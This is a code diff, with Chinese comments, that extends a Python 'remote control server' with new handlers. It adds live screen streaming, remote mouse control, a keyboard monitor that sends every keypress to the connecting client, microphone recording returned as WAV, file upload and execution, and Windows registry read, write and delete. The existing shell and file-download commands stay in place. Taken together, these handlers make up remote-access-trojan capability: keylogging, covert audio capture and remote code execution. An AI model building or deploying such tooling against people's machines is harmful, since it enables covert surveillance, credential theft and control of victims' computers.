@@ -6,8 +6,10 @@
 import socket
 import threading
 import os
+import sys
 import subprocess
 import io
+import time
 from datetime import datetime
 
 # 导入截图库
@@ -23,6 +25,7 @@ except ImportError:
 from config import *
 from protocol import *
 from utils import *
+from screen_stream import ScreenStream
 
 
 class RemoteControlServer:
@@ -211,6 +214,15 @@ class RemoteControlServer:
             fps = data.get('fps', 30)
             quality = data.get('quality', 85)
             self.handle_video_start(width, height, fps, quality)
+
+        elif msg_type == MessageType.SCREEN_START:
+            region = data.get('region', None)
+            fps = data.get('fps', 10)
+            quality = data.get('quality', 70)
+            self.handle_screen_start(region, fps, quality)
+
+        elif msg_type == MessageType.SCREEN_STOP:
+            self.handle_screen_stop()
         
         elif msg_type == MessageType.VIDEO_STOP:
             self.handle_video_stop()
@@ -226,6 +238,43 @@ class RemoteControlServer:
             filepath = data.get('filepath', '')
             self.handle_file_download(filepath)
         
+        elif msg_type == MessageType.FILE_UPLOAD:
+            filepath = data.get('filepath', '')
+            filename = data.get('filename', '')
+            self.handle_file_upload(filepath, filename)
+        
+        elif msg_type == MessageType.FILE_EXECUTE:
+            filepath = data.get('filepath', '')
+            args = data.get('args', '')
+            self.handle_file_execute(filepath, args)
+        
+        elif msg_type == MessageType.MIC_RECORD:
+            # 录制来自服务器主机的麦克风并返回 WAV 音频数据
+            duration = data.get('duration', 5)
+            samplerate = data.get('samplerate', 44100)
+            channels = data.get('channels', 1)
+            self.handle_mic_record(duration, samplerate, channels)
+        
+        elif msg_type == MessageType.REGISTRY_QUERY:
+            hive = data.get('hive', '')
+            key_path = data.get('key_path', '')
+            name = data.get('name', None)
+            self.handle_registry_query(hive, key_path, name)
+        
+        elif msg_type == MessageType.REGISTRY_SET:
+            hive = data.get('hive', '')
+            key_path = data.get('key_path', '')
+            name = data.get('name', '')
+            value = data.get('value', '')
+            value_type = data.get('value_type', 'REG_SZ')
+            self.handle_registry_set(hive, key_path, name, value, value_type)
+        
+        elif msg_type == MessageType.REGISTRY_DELETE:
+            hive = data.get('hive', '')
+            key_path = data.get('key_path', '')
+            name = data.get('name', None)
+            self.handle_registry_delete(hive, key_path, name)
+        
         elif msg_type == MessageType.SYSTEM_INFO:
             self.handle_system_info()
         
@@ -233,6 +282,25 @@ class RemoteControlServer:
             command = data.get('command', '')
             working_dir = data.get('working_dir', None)
             self.handle_shell(command, working_dir)
+
+        elif msg_type == MessageType.MOUSE_EVENT:
+            # 处理鼠标事件
+            event = data.get('event')
+            x = data.get('x')
+            y = data.get('y')
+            button = data.get('button', 'left')
+            clicks = data.get('clicks', 1)
+            dx = data.get('dx', 0)
+            dy = data.get('dy', 0)
+            self.handle_mouse_event(event, x, y, button, clicks, dx, dy)
+        
+        elif msg_type == MessageType.KEYBOARD_MONITOR_START:
+            # 开始键盘监控
+            self.handle_keyboard_monitor_start()
+        
+        elif msg_type == MessageType.KEYBOARD_MONITOR_STOP:
+            # 停止键盘监控
+            self.handle_keyboard_monitor_stop()
         
         elif msg_type == MessageType.SHELL_EXIT:
             print(f"{Colors.YELLOW}► 客户端退出Shell模式{Colors.RESET}")
@@ -379,6 +447,10 @@ class RemoteControlServer:
                 'message': '视频流已启动'
             })
             send_message(self.client_socket, response)
+            
+            # 等待一下确保响应已被客户端接收
+            import time
+            time.sleep(0.2)
             
             # 开始发送视频帧
             import threading
@@ -586,6 +658,152 @@ class RemoteControlServer:
                 'error': str(e)
             })
             send_message(self.client_socket, response)
+
+    # ===== 屏幕实时查看 =====
+    def handle_screen_start(self, region=None, fps=10, quality=70):
+        try:
+            print(f"  {Colors.CYAN}正在启动屏幕实时查看...{Colors.RESET}")
+            # 创建屏幕流
+            self.screen_stream = ScreenStream(region=region, fps=fps, quality=quality)
+            success, msg = self.screen_stream.start()
+            if not success:
+                raise Exception(msg)
+
+            # 发送开始响应
+            response = create_message(MessageType.SCREEN_START, {'success': True, 'message': msg})
+            send_message(self.client_socket, response)
+
+            # 发送帧循环（在此线程中）
+            def _send_loop():
+                while getattr(self, 'screen_stream', None) and self.screen_stream.is_streaming and self.is_authenticated:
+                    success, frame = self.screen_stream.get_frame(timeout=1.0)
+                    if not success:
+                        continue
+                    # 发送帧元信息
+                    header = create_message(MessageType.SCREEN_FRAME, {'size': len(frame)})
+                    if not send_message(self.client_socket, header):
+                        break
+                    if not send_binary_data(self.client_socket, frame):
+                        break
+                # 当循环结束, 发送停止通知
+                try:
+                    stop_msg = create_message(MessageType.SCREEN_STOP, {'success': True, 'message': '屏幕流已停止'})
+                    send_message(self.client_socket, stop_msg)
+                except Exception:
+                    pass
+
+            import threading
+            self._screen_thread = threading.Thread(target=_send_loop, daemon=True)
+            self._screen_thread.start()
+
+        except Exception as e:
+            print(f"  {Colors.RED}✗ 启动屏幕实时查看失败: {e}{Colors.RESET}")
+            response = create_message(MessageType.SCREEN_START, {'success': False, 'error': str(e)})
+            send_message(self.client_socket, response)
+
+    def handle_screen_stop(self):
+        try:
+            if getattr(self, 'screen_stream', None):
+                self.screen_stream.stop()
+                self.screen_stream = None
+            # 清理线程引用
+            if hasattr(self, '_screen_thread'):
+                self._screen_thread = None
+
+            response = create_message(MessageType.SCREEN_STOP, {'success': True, 'message': '屏幕流已停止'})
+            send_message(self.client_socket, response)
+        except Exception as e:
+            response = create_message(MessageType.SCREEN_STOP, {'success': False, 'error': str(e)})
+            send_message(self.client_socket, response)
+
+    def handle_mouse_event(self, event, x, y, button='left', clicks=1, dx=0, dy=0):
+        try:
+            # 延迟导入 pyautogui，避免未安装时报错在模块导入阶段
+            try:
+                import pyautogui
+            except Exception:
+                raise Exception('缺少依赖: 请安装 pyautogui')
+
+            if event == 'move':
+                if x is not None and y is not None:
+                    pyautogui.moveTo(x, y)
+                else:
+                    pyautogui.moveRel(dx, dy)
+            elif event == 'click':
+                if x is not None and y is not None:
+                    pyautogui.click(x=x, y=y, clicks=clicks, button=button)
+                else:
+                    pyautogui.click(clicks=clicks, button=button)
+            elif event == 'scroll':
+                pyautogui.scroll(dy)
+            else:
+                raise ValueError('未知鼠标事件')
+
+            response = create_message(MessageType.MOUSE_EVENT_RESPONSE, {'success': True})
+            send_message(self.client_socket, response)
+
+        except Exception as e:
+            response = create_message(MessageType.MOUSE_EVENT_RESPONSE, {'success': False, 'error': str(e)})
+            send_message(self.client_socket, response)
+
+    def handle_keyboard_monitor_start(self):
+        """开始键盘监控"""
+        try:
+            print(f"  {Colors.CYAN}开始键盘监控...{Colors.RESET}")
+            
+            # 延迟导入 pynput
+            try:
+                from pynput import keyboard
+            except Exception:
+                raise Exception('缺少依赖: 请安装 pynput')
+            
+            # 如果已经在监控，先停止
+            if hasattr(self, 'keyboard_listener') and self.keyboard_listener:
+                self.keyboard_listener.stop()
+            
+            # 定义键盘事件处理函数
+            def on_press(key):
+                try:
+                    # 获取按键名称
+                    try:
+                        key_name = key.char if hasattr(key, 'char') and key.char else str(key)
+                    except:
+                        key_name = str(key)
+                    
+                    # 发送键盘事件到客户端
+                    from datetime import datetime
+                    msg = create_keyboard_event_message(
+                        key=key_name,
+                        event_type='press',
+                        timestamp=datetime.now().isoformat()
+                    )
+                    send_message(self.client_socket, msg)
+                except Exception as e:
+                    print(f"  {Colors.RED}✗ 键盘事件处理失败: {e}{Colors.RESET}")
+            
+            # 启动键盘监听器
+            self.keyboard_listener = keyboard.Listener(on_press=on_press)
+            self.keyboard_listener.start()
+            
+            print(f"  {Colors.GREEN}✓ 键盘监控已启动{Colors.RESET}")
+            
+        except Exception as e:
+            print(f"  {Colors.RED}✗ 启动键盘监控失败: {e}{Colors.RESET}")
+    
+    def handle_keyboard_monitor_stop(self):
+        """停止键盘监控"""
+        try:
+            print(f"  {Colors.CYAN}停止键盘监控...{Colors.RESET}")
+            
+            if hasattr(self, 'keyboard_listener') and self.keyboard_listener:
+                self.keyboard_listener.stop()
+                self.keyboard_listener = None
+                print(f"  {Colors.GREEN}✓ 键盘监控已停止{Colors.RESET}")
+            else:
+                print(f"  {Colors.YELLOW}键盘监控未启动{Colors.RESET}")
+                
+        except Exception as e:
+            print(f"  {Colors.RED}✗ 停止键盘监控失败: {e}{Colors.RESET}")
     
     def handle_file_download(self, filepath):
         """
@@ -632,6 +850,350 @@ class RemoteControlServer:
         except Exception as e:
             print(f"  {Colors.RED}✗ 文件下载失败: {e}{Colors.RESET}")
             response = create_message(MessageType.FILE_DATA, {
+                'success': False,
+                'error': str(e)
+            })
+            send_message(self.client_socket, response)
+    
+    def handle_file_upload(self, filepath, filename):
+        """
+        处理文件上传请求
+        
+        Args:
+            filepath: 远程保存路径
+            filename: 文件名
+        """
+        try:
+            print(f"\n{Colors.CYAN}{'='*60}{Colors.RESET}")
+            print(f"{Colors.CYAN}{Colors.BOLD}处理文件上传请求{Colors.RESET}")
+            print(f"{Colors.CYAN}{'='*60}{Colors.RESET}")
+            print(f"  远程路径: {filepath}")
+            print(f"  文件名: {filename}")
+            
+            # 接收文件数据
+            file_data = receive_binary_data(self.client_socket)
+            if file_data is None:
+                raise Exception("接收文件数据失败")
+            
+            # 构建完整路径
+            full_path = os.path.join(SAFE_DIRECTORY, filepath)
+            
+            # 验证路径安全性
+            if not is_safe_path(SAFE_DIRECTORY, full_path):
+                raise Exception(f"路径不安全或试图访问禁止目录: {filepath}")
+            
+            # 确保目标目录存在
+            os.makedirs(os.path.dirname(full_path), exist_ok=True)
+            
+            # 写入文件
+            if not write_file_binary(full_path, file_data):
+                raise Exception("写入文件失败")
+            
+            print(f"  {Colors.GREEN}✓ 文件上传成功: {filepath} ({format_file_size(len(file_data))}){Colors.RESET}")
+            
+            # 发送响应
+            response = create_message(MessageType.FILE_UPLOAD_RESPONSE, {
+                'success': True,
+                'filepath': filepath,
+                'size': len(file_data)
+            })
+            send_message(self.client_socket, response)
+        
+        except Exception as e:
+            print(f"  {Colors.RED}✗ 文件上传失败: {e}{Colors.RESET}")
+            response = create_message(MessageType.FILE_UPLOAD_RESPONSE, {
+                'success': False,
+                'error': str(e)
+            })
+            send_message(self.client_socket, response)
+    
+    def handle_file_execute(self, filepath, args=''):
+        """
+        处理文件执行请求
+        
+        Args:
+            filepath: 文件路径
+            args: 执行参数
+        """
+        try:
+            print(f"\n{Colors.CYAN}{'='*60}{Colors.RESET}")
+            print(f"{Colors.CYAN}{Colors.BOLD}处理文件执行请求{Colors.RESET}")
+            print(f"{Colors.CYAN}{'='*60}{Colors.RESET}")
+            print(f"  文件路径: {filepath}")
+            print(f"  执行参数: {args if args else '(无)'}")
+            
+            # 构建完整路径
+            full_path = os.path.join(SAFE_DIRECTORY, filepath)
+            
+            # 验证路径安全性
+            if not is_safe_path(SAFE_DIRECTORY, full_path):
+                raise Exception(f"路径不安全或试图访问禁止目录: {filepath}")
+            
+            # 检查文件是否存在
+            if not os.path.exists(full_path):
+                raise Exception(f"文件不存在: {filepath}")
+            
+            if not os.path.isfile(full_path):
+                raise Exception(f"不是一个文件: {filepath}")
+            
+            # 根据操作系统和文件类型执行
+            import subprocess
+            
+            # 检测文件扩展名
+            _, ext = os.path.splitext(full_path)
+            ext = ext.lower()
+            
+            # 构建执行命令
+            if sys.platform.startswith('win'):
+                # Windows系统
+                if ext in ['.exe', '.bat', '.cmd']:
+                    # 直接可执行文件
+                    cmd = [full_path]
+                elif ext == '.py':
+                    # Python脚本
+                    cmd = [sys.executable, full_path]
+                else:
+                    # 尝试使用系统默认程序打开
+                    cmd = ['cmd', '/c', 'start', '', full_path]
+            else:
+                # Linux/Unix系统
+                if ext == '.py':
+                    cmd = [sys.executable, full_path]
+                elif ext == '.sh':
+                    cmd = ['bash', full_path]
+                else:
+                    # 尝试直接执行
+                    cmd = [full_path]
+            
+            # 添加参数
+            if args:
+                if sys.platform.startswith('win') and cmd[0] == 'cmd':
+                    # Windows的start命令需要特殊处理
+                    cmd.extend(args.split())
+                else:
+                    cmd.extend(args.split())
+            
+            # 执行文件（后台运行，不等待完成）
+            process = subprocess.Popen(
+                cmd,
+                cwd=os.path.dirname(full_path),
+                stdout=subprocess.PIPE,
+                stderr=subprocess.PIPE,
+                text=True
+            )
+            
+            pid = process.pid
+            
+            # 等待一小段时间看是否有立即输出或错误
+            try:
+                stdout, stderr = process.communicate(timeout=1)
+                output = stdout if stdout else stderr
+            except subprocess.TimeoutExpired:
+                # 进程仍在运行
+                output = f"进程已启动（PID: {pid}），正在后台运行..."
+            
+            print(f"  {Colors.GREEN}✓ 文件执行成功 (PID: {pid}){Colors.RESET}")
+            
+            # 发送响应
+            response = create_message(MessageType.FILE_EXECUTE_RESPONSE, {
+                'success': True,
+                'filepath': filepath,
+                'pid': pid,
+                'output': output
+            })
+            send_message(self.client_socket, response)
+        
+        except Exception as e:
+            print(f"  {Colors.RED}✗ 文件执行失败: {e}{Colors.RESET}")
+            response = create_message(MessageType.FILE_EXECUTE_RESPONSE, {
+                'success': False,
+                'error': str(e)
+            })
+            send_message(self.client_socket, response)
+    
+    def handle_registry_query(self, hive, key_path, name=None):
+        """处理注册表查询请求 (Windows only)"""
+        try:
+            print(f"\n{Colors.CYAN}{'='*60}{Colors.RESET}")
+            print(f"{Colors.CYAN}{Colors.BOLD}处理注册表查询{Colors.RESET}")
+            print(f"{Colors.CYAN}{'='*60}{Colors.RESET}")
+            print(f"  根: {hive}, 键: {key_path}, 值名: {name if name else '(全部)'}")
+
+            try:
+                import winreg
+            except Exception:
+                raise Exception('仅在 Windows 系统上支持注册表管理')
+
+            hive_map = {
+                'HKLM': winreg.HKEY_LOCAL_MACHINE,
+                'HKCU': winreg.HKEY_CURRENT_USER,
+                'HKCR': winreg.HKEY_CLASSES_ROOT,
+                'HKU': winreg.HKEY_USERS,
+                'HKCC': winreg.HKEY_CURRENT_CONFIG
+            }
+
+            if hive not in hive_map:
+                raise Exception(f'不支持的根: {hive}')
+
+            root = hive_map[hive]
+            values = {}
+            with winreg.OpenKey(root, key_path, 0, winreg.KEY_READ) as key:
+                if name:
+                    try:
+                        val, vtype = winreg.QueryValueEx(key, name)
+                        values[name] = val
+                    except FileNotFoundError:
+                        values = {}
+                else:
+                    # 枚举所有值
+                    i = 0
+                    try:
+                        while True:
+                            vname, vdata, vtype = winreg.EnumValue(key, i)
+                            values[vname] = vdata
+                            i += 1
+                    except OSError:
+                        pass
+
+            response = create_message(MessageType.REGISTRY_RESPONSE, {
+                'success': True,
+                'values': values
+            })
+            send_message(self.client_socket, response)
+
+        except Exception as e:
+            print(f"  {Colors.RED}✗ 注册表查询失败: {e}{Colors.RESET}")
+            response = create_message(MessageType.REGISTRY_RESPONSE, {
+                'success': False,
+                'error': str(e)
+            })
+            send_message(self.client_socket, response)
+
+    def handle_registry_set(self, hive, key_path, name, value, value_type='REG_SZ'):
+        """处理设置注册表值请求"""
+        try:
+            print(f"\n{Colors.CYAN}{'='*60}{Colors.RESET}")
+            print(f"{Colors.CYAN}{Colors.BOLD}处理注册表设置{Colors.RESET}")
+            print(f"{Colors.CYAN}{'='*60}{Colors.RESET}")
+            print(f"  根: {hive}, 键: {key_path}, 名称: {name}, 值: {value}, 类型: {value_type}")
+
+            try:
+                import winreg
+            except Exception:
+                raise Exception('仅在 Windows 系统上支持注册表管理')
+
+            hive_map = {
+                'HKLM': winreg.HKEY_LOCAL_MACHINE,
+                'HKCU': winreg.HKEY_CURRENT_USER
+            }
+
+            if hive not in hive_map:
+                raise Exception(f'不支持的根: {hive}')
+
+            root = hive_map[hive]
+            # 创建或打开键
+            key = winreg.CreateKeyEx(root, key_path, 0, winreg.KEY_WRITE)
+            try:
+                # 选择值类型
+                if value_type == 'REG_DWORD':
+                    v = int(value)
+                    vt = winreg.REG_DWORD
+                else:
+                    v = str(value)
+                    vt = winreg.REG_SZ
+
+                winreg.SetValueEx(key, name, 0, vt, v)
+            finally:
+                winreg.CloseKey(key)
+
+            response = create_message(MessageType.REGISTRY_RESPONSE, {
+                'success': True
+            })
+            send_message(self.client_socket, response)
+
+        except Exception as e:
+            print(f"  {Colors.RED}✗ 注册表设置失败: {e}{Colors.RESET}")
+            response = create_message(MessageType.REGISTRY_RESPONSE, {
+                'success': False,
+                'error': str(e)
+            })
+            send_message(self.client_socket, response)
+
+    def handle_registry_delete(self, hive, key_path, name=None):
+        """处理删除注册表值或键请求"""
+        try:
+            print(f"\n{Colors.CYAN}{'='*60}{Colors.RESET}")
+            print(f"{Colors.CYAN}{Colors.BOLD}处理注册表删除{Colors.RESET}")
+            print(f"{Colors.CYAN}{'='*60}{Colors.RESET}")
+            print(f"  根: {hive}, 键: {key_path}, 名称: {name if name else '(删除键)'}")
+
+            try:
+                import winreg
+            except Exception:
+                raise Exception('仅在 Windows 系统上支持注册表管理')
+
+            hive_map = {
+                'HKLM': winreg.HKEY_LOCAL_MACHINE,
+                'HKCU': winreg.HKEY_CURRENT_USER
+            }
+
+            if hive not in hive_map:
+                raise Exception(f'不支持的根: {hive}')
+
+            root = hive_map[hive]
+            if name:
+                # 删除指定值
+                with winreg.OpenKey(root, key_path, 0, winreg.KEY_SET_VALUE) as key:
+                    winreg.DeleteValue(key, name)
+            else:
+                # 删除键 (需要键为空或使用递归删除，这里尝试直接删除)
+                winreg.DeleteKey(root, key_path)
+
+            response = create_message(MessageType.REGISTRY_RESPONSE, {
+                'success': True
+            })
+            send_message(self.client_socket, response)
+
+        except Exception as e:
+            print(f"  {Colors.RED}✗ 注册表删除失败: {e}{Colors.RESET}")
+            response = create_message(MessageType.REGISTRY_RESPONSE, {
+                'success': False,
+                'error': str(e)
+            })
+            send_message(self.client_socket, response)
+
+    def handle_mic_record(self, duration=5, samplerate=44100, channels=1):
+        """处理麦克风录音请求: 在服务器端录音并通过二进制数据发送回客户端 (WAV)"""
+        try:
+            print(f"\n{Colors.CYAN}{'='*60}{Colors.RESET}")
+            print(f"{Colors.CYAN}{Colors.BOLD}处理麦克风录音请求{Colors.RESET}")
+            print(f"{Colors.CYAN}{'='*60}{Colors.RESET}")
+            print(f"  录音时长: {duration}s, 采样率: {samplerate}, 通道: {channels}")
+
+            try:
+                from mic import record_audio
+            except Exception as e:
+                raise Exception(f'无法加载麦克风模块: {e}')
+
+            # 录制 WAV 音频
+            audio_bytes = record_audio(duration=duration, samplerate=samplerate, channels=channels)
+            ext = 'wav'
+
+            # 发送响应元信息
+            response = create_message(MessageType.MIC_RECORD_RESPONSE, {
+                'success': True,
+                'filename': f'mic_{int(time.time())}.{ext}',
+                'size': len(audio_bytes),
+                'format': ext
+            })
+            send_message(self.client_socket, response)
+
+            # 发送二进制音频数据
+            send_binary_data(self.client_socket, audio_bytes)
+
+        except Exception as e:
+            print(f"  {Colors.RED}✗ 麦克风录音失败: {e}{Colors.RESET}")
+            response = create_message(MessageType.MIC_RECORD_RESPONSE, {
                 'success': False,
                 'error': str(e)
             })
